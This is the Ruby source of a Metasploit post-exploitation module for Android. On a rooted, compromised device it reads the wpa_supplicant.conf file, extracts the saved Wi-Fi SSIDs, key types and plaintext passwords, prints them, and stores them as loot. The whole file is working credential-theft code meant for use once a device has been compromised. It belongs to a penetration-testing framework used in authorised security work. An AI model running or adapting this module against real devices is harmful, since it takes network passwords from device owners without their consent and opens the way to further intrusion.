##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Displays wireless SSIDs and PSKs",
        'Description'   => %q{
            This module displays all wireless AP creds saved on the target device.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Auxilus', 'timwr'],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
      }
    ))
  end

  def run
    unless is_root?
      print_error("This module requires root permissions.")
      return
    end

    data = read_file("/data/misc/wifi/wpa_supplicant.conf")
    aps = parse_wpa_supplicant(data)

    if aps.empty?
      print_error("No wireless APs found on the device")
      return
    end
    ap_tbl = Rex::Text::Table.new(
      'Header'  => 'Wireless APs',
      'Indent'  => 1,
      'Columns' => ['SSID','net_type', 'password']
    )

    aps.each do |ap|
      ap_tbl << [
        ap[0],  # SSID
        ap[1],  # TYPE
        ap[2]   # PASSWORD
      ]
    end

    print_line(ap_tbl.to_s)
    p = store_loot(
      'wireless.ap.creds',
      'text/csv',
      session,
      ap_tbl.to_csv,
      File.basename('wireless_ap_credentials.txt')
    )
    print_good("Secrets stored in: #{p}")
  end

  def parse_wpa_supplicant(data)
    aps = []
    networks = data.scan(/^network={$(.*?)^}$/m)
    networks.each do |block|
      aps << parse_network_block(block[0])
    end
    aps
  end

  def parse_network_block(block)
    ssid = parse_option(block, 'ssid')
    type = parse_option(block, 'key_mgmt', false)
    psk = parse_option(block, 'psk')
    [ssid, type, psk]
  end

  def parse_option(block, token, strip_quotes = true)
    if strip_quotes and result = block.match(/^\s#{token}="(.+)"$/)
      return result.captures[0]
    elsif result = block.match(/^\s#{token}=(.+)$/)
      return result.captures[0]
    end
  end

end
